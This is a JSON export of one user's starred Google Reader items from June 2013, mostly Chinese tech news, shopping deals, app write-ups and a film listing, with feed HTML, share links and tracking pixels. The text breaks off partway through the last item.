{
  "id" : "user/07404792466326621424/state/com.google/starred",
  "title" : "Leask's starred items in Google Reader",
  "author" : "Leask",
  "updated" : 1371863305,
  "direction" : "ltr",
  "items" : [ {
    "crawlTimeMsec" : "1371863305078",
    "timestampUsec" : "1371863305078650",
    "id" : "tag:google.com,2005:reader/item/08380b06b66e81fc",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "AOL今日发布Google Reader替代品 - AOL Reader",
    "published" : 1371857712,
    "updated" : 1371857712,
    "alternate" : [ {
      "href" : "http://www.cnbeta.com/articles/242061.htm",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><strong>就在Google Reader的使命接近完结时，AOL突然发布了一款订阅工具AOL Reader，</strong>这款产品目前还处在内测阶段，但部分截图已经出现在网络上。AOL表示，这款阅读器不仅可以在PC上用，还对移动设备进行了专门的CSS优化，操作更灵敏并支持触控手势操作。同时还支持LinkedIn, Google+, Twitter和Facebook的社交网络共享。这样一来Google Reader宣告关闭后，目前表示将推出订阅工具的厂商有Feedly，BlogLovin，Digg和AOL。</p><img width=\"1\" height=\"1\" src=\"http://cnbeta.feedsportal.com/c/34306/f/624776/s/2da0b8db/mf.gif\" border=\"0\"><div><table border=\"0\"><tr><td valign=\"middle\"><a href=\"http://share.feedsportal.com/share/twitter/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F242061.htm&amp;t=AOL%E4%BB%8A%E6%97%A5%E5%8F%91%E5%B8%83Google+Reader%E6%9B%BF%E4%BB%A3%E5%93%81+-+AOL+Reader\"><img src=\"http://res3.feedsportal.com/social/twitter.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/facebook/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F242061.htm&amp;t=AOL%E4%BB%8A%E6%97%A5%E5%8F%91%E5%B8%83Google+Reader%E6%9B%BF%E4%BB%A3%E5%93%81+-+AOL+Reader\"><img src=\"http://res3.feedsportal.com/social/facebook.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/linkedin/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F242061.htm&amp;t=AOL%E4%BB%8A%E6%97%A5%E5%8F%91%E5%B8%83Google+Reader%E6%9B%BF%E4%BB%A3%E5%93%81+-+AOL+Reader\"><img src=\"http://res3.feedsportal.com/social/linkedin.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/gplus/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F242061.htm&amp;t=AOL%E4%BB%8A%E6%97%A5%E5%8F%91%E5%B8%83Google+Reader%E6%9B%BF%E4%BB%A3%E5%93%81+-+AOL+Reader\"><img src=\"http://res3.feedsportal.com/social/googleplus.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/email/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F242061.htm&amp;t=AOL%E4%BB%8A%E6%97%A5%E5%8F%91%E5%B8%83Google+Reader%E6%9B%BF%E4%BB%A3%E5%93%81+-+AOL+Reader\"><img src=\"http://res3.feedsportal.com/social/email.png\" border=\"0\"></a></td><td valign=\"middle\"></td></tr></table></div><br><br><a href=\"http://da.feedsportal.com/r/165665334405/u/31/f/624776/c/34306/s/2da0b8db/a2.htm\"><img src=\"http://da.feedsportal.com/r/165665334405/u/31/f/624776/c/34306/s/2da0b8db/a2.img\" border=\"0\"></a><img width=\"1\" height=\"1\" src=\"http://pi.feedsportal.com/r/165665334405/u/31/f/624776/c/34306/s/2da0b8db/a2t.img\" border=\"0\">"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cnbeta.com/backend.php",
      "title" : "cnBeta.COM业界资讯",
      "htmlUrl" : "http://www.cnbeta.com"
    }
  }, {
    "crawlTimeMsec" : "1371743042012",
    "timestampUsec" : "1371743042012968",
    "id" : "tag:google.com,2005:reader/item/f133d05b36eb9bc2",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "GAO 捷欧 24小时 节能迷你定时器（三孔）　19元",
    "published" : 1371707673,
    "updated" : 1371707673,
    "alternate" : [ {
      "href" : "http://www.smzdm.com/youhui/248997",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>GAO捷欧迷你24小时机械式节能定时器，通过简单设定，即可每天按照你预先设定的时间段，24小时循环自动接通和关闭电源。最小设定值30分钟，设定后无需每天启动，将自动按照设定时间每天循环！适用于电热水器、饮水机、照明等电器设备。例如可以将饮水机设置为夜间自动关闭，不再需要人工操作开关。最大负载：1800W。既节约资源，又实实在在的省钱。</p>\n<p>京东商城目前特价至19元，近期低价，在京东买东西时可以顺带1个。根据网友评价，这款为三孔设计，非图中的新国标5孔，好在需要用定时器节能的电器都是这种三孔插头，应急用用足够了。</p>\n<p><a href=\"http://www.smzdm.com/youhui/248997\">购买详情链接</a><br><img src=\"http://img12.360buyimg.com/n1/3179/ba49e2b9-5612-4c95-926a-497564fad006.jpg\" alt=\"\"></p>\n<p>GAO 捷欧 24小时 节能迷你定时器（三孔）　19元，首发于什么值得买。</p><p>本文来自<a href=\"http://www.smzdm.com/youhui/248997\">什么值得买网站（www.smzdm.com）</a>。</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.smzdm.com/",
      "title" : "什么值得买",
      "htmlUrl" : "http://www.smzdm.com"
    }
  }, {
    "crawlTimeMsec" : "1371727238476",
    "timestampUsec" : "1371727238476699",
    "id" : "tag:google.com,2005:reader/item/680df0ddf8892ab8",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "Google Chrome 谷歌浏览器" ],
    "title" : "[图]Google发布首个测试版Dart SDK 分析引擎提速20%",
    "published" : 1371697838,
    "updated" : 1371697838,
    "alternate" : [ {
      "href" : "http://www.cnbeta.com/articles/241839.htm",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<b>Google在今天<a href=\"http://blog.chromium.org/2013/06/dart-faster-editor-and-more.html\">宣布</a>了其首个Dart SDK和编辑器，带来了性能和跨平台效率的改进。编辑器的引擎(负责报告警告和错误)也已经被完全重写。</b>Google表示，现其解析和分析速度已经快上了20%。此外，在发现一个输入错误(typo)的时候，也没有必要运行所有的单元测试(Dart编辑器会追踪用户键入的所有内容)。<br><img width=\"1\" height=\"1\" src=\"http://cnbeta.feedsportal.com/c/34306/f/624776/s/2d881469/mf.gif\" border=\"0\"><div><table border=\"0\"><tr><td valign=\"middle\"><a href=\"http://share.feedsportal.com/share/twitter/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241839.htm&amp;t=%5B%E5%9B%BE%5DGoogle%E5%8F%91%E5%B8%83%E9%A6%96%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%89%88Dart+SDK+%E5%88%86%E6%9E%90%E5%BC%95%E6%93%8E%E6%8F%90%E9%80%9F20%25\"><img src=\"http://res3.feedsportal.com/social/twitter.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/facebook/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241839.htm&amp;t=%5B%E5%9B%BE%5DGoogle%E5%8F%91%E5%B8%83%E9%A6%96%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%89%88Dart+SDK+%E5%88%86%E6%9E%90%E5%BC%95%E6%93%8E%E6%8F%90%E9%80%9F20%25\"><img src=\"http://res3.feedsportal.com/social/facebook.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/linkedin/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241839.htm&amp;t=%5B%E5%9B%BE%5DGoogle%E5%8F%91%E5%B8%83%E9%A6%96%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%89%88Dart+SDK+%E5%88%86%E6%9E%90%E5%BC%95%E6%93%8E%E6%8F%90%E9%80%9F20%25\"><img src=\"http://res3.feedsportal.com/social/linkedin.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/gplus/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241839.htm&amp;t=%5B%E5%9B%BE%5DGoogle%E5%8F%91%E5%B8%83%E9%A6%96%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%89%88Dart+SDK+%E5%88%86%E6%9E%90%E5%BC%95%E6%93%8E%E6%8F%90%E9%80%9F20%25\"><img src=\"http://res3.feedsportal.com/social/googleplus.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/email/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241839.htm&amp;t=%5B%E5%9B%BE%5DGoogle%E5%8F%91%E5%B8%83%E9%A6%96%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%89%88Dart+SDK+%E5%88%86%E6%9E%90%E5%BC%95%E6%93%8E%E6%8F%90%E9%80%9F20%25\"><img src=\"http://res3.feedsportal.com/social/email.png\" border=\"0\"></a></td><td valign=\"middle\"></td></tr></table></div><br><br><a href=\"http://da.feedsportal.com/r/165666272011/u/31/f/624776/c/34306/s/2d881469/a2.htm\"><img src=\"http://da.feedsportal.com/r/165666272011/u/31/f/624776/c/34306/s/2d881469/a2.img\" border=\"0\"></a><img width=\"1\" height=\"1\" src=\"http://pi.feedsportal.com/r/165666272011/u/31/f/624776/c/34306/s/2d881469/a2t.img\" border=\"0\">"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cnbeta.com/backend.php",
      "title" : "cnBeta.COM业界资讯",
      "htmlUrl" : "http://www.cnbeta.com"
    }
  }, {
    "crawlTimeMsec" : "1371670136272",
    "timestampUsec" : "1371670136272595",
    "id" : "tag:google.com,2005:reader/item/09ebec977d11b96f",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "想用python写一个代理http的代理程序，有没有可以参考的源代码？",
    "published" : 1371625149,
    "updated" : 1371707898,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/72897#reply8",
      "type" : "text/html"
    } ],
    "author" : "Tinet",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "crawlTimeMsec" : "1371670102289",
    "timestampUsec" : "1371670102289369",
    "id" : "tag:google.com,2005:reader/item/f2d6b6b3282e6ebe",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "TPT 荣知园 12寸 超级巨星 儿童自行车　324元包邮（可凑满399减100）",
    "published" : 1371628370,
    "updated" : 1371628370,
    "alternate" : [ {
      "href" : "http://www.smzdm.com/youhui/248337",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>荣知园TPT的自行车什么值得买推荐多次了，网友反馈安装简单，物有所值。12寸的超级巨星儿童自行车适合3~6岁的男宝，车型采用高强度高碳钢为车架材质，车型轮径为12英寸，使用6061级铝圈，配置转向限位器，可以保证车把只能左右转动60度，从而避免出现车把末端调转过来戳伤宝宝的情况，更坚固耐用。</p>\n<p>亚马逊中国目前售价324元，可凑满399减150，如凑上5瓶蓝月亮洗衣液，结算时输入优惠码“<span style=\"color:#bc0202\">BIJIAYUE</span>”，实付303.5元，当然也可以去活动页面挑选合适的凑单品。家中有孩子的朋友可以考虑入手。</p>\n<p><a href=\"http://www.smzdm.com/youhui/248337\">购买详情链接</a><br><img src=\"http://pn.zdmimg.com/201306/19/1bb13761.jpg_n1.jpg\" alt=\"\"></p>\n<p>TPT 荣知园 12寸 超级巨星 儿童自行车　324元包邮（可凑满399减100），首发于什么值得买。</p><p>本文来自<a href=\"http://www.smzdm.com/youhui/248337\">什么值得买网站（www.smzdm.com）</a>。</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.smzdm.com/",
      "title" : "什么值得买",
      "htmlUrl" : "http://www.smzdm.com"
    }
  }, {
    "crawlTimeMsec" : "1371622934685",
    "timestampUsec" : "1371622934685244",
    "id" : "tag:google.com,2005:reader/item/c37b0739cc2f98ef",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "中国合伙人 - American Dreams in China.2013.720p.HDrip.x264.AC3-SmY",
    "published" : 1371610601,
    "updated" : 1371610601,
    "alternate" : [ {
      "href" : "http://imax.im/movies/54705",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://imax.im/movies/54705\"><img alt=\"Large_33b2dd2e100508c9a71b7e844dbad0cb\" src=\"http://movieso.b0.upaiyun.com/movie/large_33b2dd2e100508c9a71b7e844dbad0cb.jpg\"></a><br> / 中国大陆,香港 /  / 黄晓明,邓超,佟大为,杜鹃 / 陈可辛 / 20世纪80年代，三个怀有热情和梦想的年轻人在高等学府燕京大学的校园内相遇，从此展开了他们长达三十年的友谊和梦想征途。出生于留学世家的孟晓骏（邓超 饰）渴望站在美国的土地上改变世界，浪漫自由的王阳（佟大为 饰）尽情享受改革开放初期那蓬</p>\n\n<p><a href=\"http://imax.im/movies/54705\">American Dreams in China.2013.720p.HDrip.x264.AC3-SmY</a></p>"
    },
    "author" : "",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://imax.im/movies/feed",
      "title" : "IMAX.im 最新列表",
      "htmlUrl" : "http://imax.im/"
    }
  }, {
    "crawlTimeMsec" : "1371611931565",
    "timestampUsec" : "1371611931565956",
    "id" : "tag:google.com,2005:reader/item/72c0104d0598a036",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "「珍贵视频」罕见乔布斯视频",
    "published" : 1371665460,
    "updated" : 1371665460,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/15218",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><p>YouTube 上 EverySteveJobsVideo 频道近日放出了一个此前从未公开过的 Steve Jobs 视频，这个视频录制的时间大概在1994年，当时他还在 NeXT，视频中 Jobs 总结了他在个人电脑领域留下的一些遗产，并思考未来他做的事情是否会被人们记住。</p>\n\n<p><img src=\"http://www.iapps.im/public/uploadfiles/2013/06/article/491f32a93d106893f9ef16f090b9c496.jpg\" alt=\"\" title=\"\"></p></div>"
    },
    "author" : "iSkuggy",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "crawlTimeMsec" : "1371611782846",
    "timestampUsec" : "1371611782846687",
    "id" : "tag:google.com,2005:reader/item/db9f560cd621bf83",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "「好软首免」行事日历：Calendar",
    "published" : 1371651960,
    "updated" : 1371651960,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/15205",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><img src=\"http://a944.phobos.apple.com/us/r1000/092/Purple2/v4/bd/fc/5f/bdfc5f28-9792-dd9e-ffb6-b9304f32c1f1/mzl.tnvzrapt.175x175-75.jpg\" style=\"float:left\"><p>详细评测请查看<a href=\"http://www.iapps.im/single/11815\" title=\"\"> 800米起跳\uD83D\uDC28的深情评测</a></p>\n\n<p>来自大名鼎鼎的 PDF Expert 开发商 Readdle 家的 Google Calendar 客户端，第一次打开软件，会让你选择同步的日历，是 Google Calender 还是 iOS 原生的自带日历，不管是哪一个，由于这是一款 Google Calender 客户端的行事历，你都需要一个 Google 账号。登陆之后就会进入应用主界面，UI 还是很简洁的，确实有种 Elegant 的感觉。左上角可以选择在 Calendars 里显示的日历项（你在系统的邮件设置里开启的不同账户的所有日历项，在 Calendars 里都会自动识别），左下角是设置键，可以设置默认日历，更改账号，默认启动显示（周日历、月日历或是任务列表等），设置一周的起始日期，时区，提醒音效等。个性化设置好以后，我们来看看 Calendars 添加日历项等具体操作。</p>\n\n<p>在周（日、月）视图下点击右上的加号键添加 Event，输入活动名称、选择日历类型、设置活动的起止时间或者直接开启全天事件，非全天事件的自动提醒就是你在设置里设好的默认提醒，支持邮件、闹钟、短信三种方式。（短信提醒的设置需要在 PC 端 Google 里设置，参照本文最后的介绍），当然你可以添加新提醒，修改提醒时间等。</p>\n</div><p>价格：免费</p><p>下载地址：<a href=\"http://www.iapps.im/itunes/371434886cn\">http://www.iapps.im/itunes/371434886cn</a></p><p>应用截图:</p><img src=\"http://a3.mzstatic.com/us/r1000/094/Purple2/v4/a9/52/9b/a9529b9e-eee0-fdf2-fa86-e4a0a5b42ab1/mzl.stzhkvzo.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a2.mzstatic.com/us/r1000/068/Purple/v4/eb/0b/2c/eb0b2c4e-acbe-f2dd-fa3e-caa9449c156f/mzl.jqyjsygi.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a5.mzstatic.com/us/r1000/087/Purple2/v4/8b/bc/79/8bbc79cd-2d64-6f8e-5903-254a8996c50b/mzl.vctqwayt.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a5.mzstatic.com/us/r1000/105/Purple/v4/cf/84/31/cf8431c6-1b6f-71b9-6345-a493fb509d2e/mzl.zivmhuae.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a1.mzstatic.com/us/r1000/081/Purple/v4/c2/da/43/c2da4362-bffe-4883-a9cb-d7455011c2ad/mzl.allgivoj.480x480-75.jpg\" alt=\"截图\">"
    },
    "author" : "将天破",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "crawlTimeMsec" : "1371582564027",
    "timestampUsec" : "1371582564027043",
    "id" : "tag:google.com,2005:reader/item/d567a47814ca2588",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "国行联通版iPhone 5 （裸机非合约）　4498元（24点前返150红包）",
    "published" : 1371569184,
    "updated" : 1371569184,
    "alternate" : [ {
      "href" : "http://www.smzdm.com/youhui/247535",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>天猫 宏图三胞特价至4498元了，24点前返150天猫红包，国行好价，适合送人。<span style=\"color:#bc0202\">24点前才有返券</span>，需要的得抓紧。</p>\n<p><a href=\"http://www.smzdm.com/youhui/247535\">购买详情链接</a><br><img src=\"http://pn.zdmimg.com/201306/18/2568c8e0.jpg_n1.jpg\" alt=\"\"></p>\n<p>国行联通版iPhone 5 （裸机非合约）　4498元（24点前返150红包），首发于什么值得买。</p><p>本文来自<a href=\"http://www.smzdm.com/youhui/247535\">什么值得买网站（www.smzdm.com）</a>。</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.smzdm.com/",
      "title" : "什么值得买",
      "htmlUrl" : "http://www.smzdm.com"
    }
  }, {
    "crawlTimeMsec" : "1371582464618",
    "timestampUsec" : "1371582464618097",
    "id" : "tag:google.com,2005:reader/item/c19044b4b5526949",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "高端秀：RIMOWA 日默瓦 SALSA AIR 登机箱 823.52（万向轮、34L）　2649元包邮（多重满减）",
    "published" : 1371573383,
    "updated" : 1371573383,
    "alternate" : [ {
      "href" : "http://www.smzdm.com/youhui/247677",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>rimowa是顶级的拉杆箱品牌，做工精致，坚固耐用，明星大爱，电影常见，感兴趣的网友不妨看一下这篇文章，相当有趣。最畅销的是TOPAS系列镁铝合金箱，有银色（原色）、金色（Titanium系列）、黑色（Stealth系列）等。除了镁铝合金箱外，RIMOWA也有聚碳酸酯材质（软质塑料）系列产品，系列名为SALSA，其中的SALSA AIR为超轻系列，也是RIMOWA中唯一的“单拉杆”系列。823.52是<span style=\"color:#bc0202\">34L（20寸）容量的四轮版本</span>，国内航空公司基本上都可以直接带上飞机。<strong>强烈不建议托运</strong>。</p>\n<p> </p>\n<blockquote><p>闪闪发亮的Salsa Air旅行箱以聚碳酸酯制作，配上时尚的色彩映入眼帘，而各种设计细节，则以突出的黑色展露出来。全赖Multiwheel®系统的全方位移动滚轮，加上融入旅行箱的多段式单柄伸缩杆，以及采用柔软易握垫料的人体工学把手，令旅行箱非常容易拉动。此外，Salsa Air 系列采用了最先进的保安技术打造，配备了嵌入旅行箱外壳的TSA密码锁。</p>\n<p>Salsa Air 系列的内部设计同样令人印象深刻，因为内衬采用了轻柔坚韧的降落伞绸制作，而且旅行箱的两边均设有稳固的网层，可以使用拉链闭上，令物品可以妥善和整齐存放，而且可以从两边分别拿取。</p></blockquote>\n<p>价格方面，京东商城目前多重优惠后，下单可以做到2649元包邮，这个价和淘宝代购价已经持平了。三色可选。送人的话很不错，自己用的话，适合追求生活品质的用户咯。小编还是美旅级别的。</p>\n<p><a href=\"http://www.smzdm.com/youhui/247677\">购买详情链接</a><br><img src=\"http://img10.360buyimg.com/n1/g12/M00/09/0E/rBEQYVGd2v0IAAAAAAEV2xoRwI4AAB2QgFj8fYAARXz771.jpg\" alt=\"\" width=\"350\" height=\"350\"></p>\n<p><img src=\"http://img11.360buyimg.com/n1/g12/M00/09/0E/rBEQYFGd2usIAAAAAAHLVG-VgkoAAB2QgEeCT4AActs853.jpg\" alt=\"\" width=\"350\" height=\"350\"></p>\n<p>高端秀：RIMOWA 日默瓦 SALSA AIR 登机箱 823.52（万向轮、34L）　2649元包邮（多重满减），首发于什么值得买。</p><p>本文来自<a href=\"http://www.smzdm.com/youhui/247677\">什么值得买网站（www.smzdm.com）</a>。</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.smzdm.com/",
      "title" : "什么值得买",
      "htmlUrl" : "http://www.smzdm.com"
    }
  }, {
    "crawlTimeMsec" : "1371563926973",
    "timestampUsec" : "1371563926973943",
    "id" : "tag:google.com,2005:reader/item/e5b78f895dae2beb",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "Apple 苹果" ],
    "title" : "视频展示全新Mac Pro使用的圆形铝板冲压工艺",
    "published" : 1371554892,
    "updated" : 1371554892,
    "alternate" : [ {
      "href" : "http://www.cnbeta.com/articles/241587.htm",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<b>我们都知道苹果MacBook采用一块铝板打造，这种结构比塑料更稳固、更轻。那么WWDC上新发布的“垃圾桶”形状的Mac Pro是怎样使用一块铝板打造呢？</b>Mac Pro的外壳采用了一种冲击挤压的技术，这种技术将圆饼形状的圆形铝板放在机器中，然后上方有圆柱体积压下来，力的作用导致铝只能从周围挤出来，就形成了 圆柱形的外形。下面是这种技术的演示视频，这只是技术演示，并不是苹果在生产Mac Pro！<img width=\"1\" height=\"1\" src=\"http://cnbeta.feedsportal.com/c/34306/f/624776/s/2d71d620/mf.gif\" border=\"0\"><div><table border=\"0\"><tr><td valign=\"middle\"><a href=\"http://share.feedsportal.com/share/twitter/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241587.htm&amp;t=%E8%A7%86%E9%A2%91%E5%B1%95%E7%A4%BA%E5%85%A8%E6%96%B0Mac+Pro%E4%BD%BF%E7%94%A8%E7%9A%84%E5%9C%86%E5%BD%A2%E9%93%9D%E6%9D%BF%E5%86%B2%E5%8E%8B%E5%B7%A5%E8%89%BA\"><img src=\"http://res3.feedsportal.com/social/twitter.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/facebook/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241587.htm&amp;t=%E8%A7%86%E9%A2%91%E5%B1%95%E7%A4%BA%E5%85%A8%E6%96%B0Mac+Pro%E4%BD%BF%E7%94%A8%E7%9A%84%E5%9C%86%E5%BD%A2%E9%93%9D%E6%9D%BF%E5%86%B2%E5%8E%8B%E5%B7%A5%E8%89%BA\"><img src=\"http://res3.feedsportal.com/social/facebook.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/linkedin/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241587.htm&amp;t=%E8%A7%86%E9%A2%91%E5%B1%95%E7%A4%BA%E5%85%A8%E6%96%B0Mac+Pro%E4%BD%BF%E7%94%A8%E7%9A%84%E5%9C%86%E5%BD%A2%E9%93%9D%E6%9D%BF%E5%86%B2%E5%8E%8B%E5%B7%A5%E8%89%BA\"><img src=\"http://res3.feedsportal.com/social/linkedin.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/gplus/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241587.htm&amp;t=%E8%A7%86%E9%A2%91%E5%B1%95%E7%A4%BA%E5%85%A8%E6%96%B0Mac+Pro%E4%BD%BF%E7%94%A8%E7%9A%84%E5%9C%86%E5%BD%A2%E9%93%9D%E6%9D%BF%E5%86%B2%E5%8E%8B%E5%B7%A5%E8%89%BA\"><img src=\"http://res3.feedsportal.com/social/googleplus.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/email/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241587.htm&amp;t=%E8%A7%86%E9%A2%91%E5%B1%95%E7%A4%BA%E5%85%A8%E6%96%B0Mac+Pro%E4%BD%BF%E7%94%A8%E7%9A%84%E5%9C%86%E5%BD%A2%E9%93%9D%E6%9D%BF%E5%86%B2%E5%8E%8B%E5%B7%A5%E8%89%BA\"><img src=\"http://res3.feedsportal.com/social/email.png\" border=\"0\"></a></td><td valign=\"middle\"></td></tr></table></div><br><br><a href=\"http://da.feedsportal.com/r/165665288619/u/31/f/624776/c/34306/s/2d71d620/a2.htm\"><img src=\"http://da.feedsportal.com/r/165665288619/u/31/f/624776/c/34306/s/2d71d620/a2.img\" border=\"0\"></a><img width=\"1\" height=\"1\" src=\"http://pi.feedsportal.com/r/165665288619/u/31/f/624776/c/34306/s/2d71d620/a2t.img\" border=\"0\">"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cnbeta.com/backend.php",
      "title" : "cnBeta.COM业界资讯",
      "htmlUrl" : "http://www.cnbeta.com"
    }
  }, {
    "crawlTimeMsec" : "1371548939756",
    "timestampUsec" : "1371548939756876",
    "id" : "tag:google.com,2005:reader/item/d4d635b8e34e3ecc",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "Goodbaby 好孩子 JB1252Q-K121D 儿童自行车　299元包邮（399-100）",
    "published" : 1371489639,
    "updated" : 1371489639,
    "alternate" : [ {
      "href" : "http://www.smzdm.com/youhui/245117",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>什么值得买网友“栀枝”推荐理由：“最近一直在给2岁的孩子寻找自行车，按照小区里面小朋友的情况，一般直接购买14寸较为划算，现在小可以先蹬半圈，14寸的差不多可以骑到快小学。这款京东商城价格399的，参加京东日百满399-100的活动，刚好省下来才299，这个价格平时也就买个杂牌或者小牌子，能够买到好孩子简直太划算了！</p>\n<p><a href=\"http://www.smzdm.com/youhui/245117\">购买详情链接</a><br><img src=\"http://img11.360buyimg.com/n1/g2/M02/06/13/rBEGElAXc_AIAAAAAAGpZ_dGyCcAABSgwAKhJAAAal_867.jpg\" alt=\"\"></p>\n<p> </p>\n<p>Goodbaby 好孩子 JB1252Q-K121D 儿童自行车　299元包邮（399-100），首发于什么值得买。</p><p>本文来自<a href=\"http://www.smzdm.com/youhui/245117\">什么值得买网站（www.smzdm.com）</a>。</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.smzdm.com/",
      "title" : "什么值得买",
      "htmlUrl" : "http://www.smzdm.com"
    }
  }, {
    "crawlTimeMsec" : "1371429718170",
    "timestampUsec" : "1371429718170193",
    "id" : "tag:google.com,2005:reader/item/32afb24e0211e398",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "「儿童娱乐」220首英文儿歌 ：Kids Song All",
    "published" : 1371440264,
    "updated" : 1371440264,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/15166",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
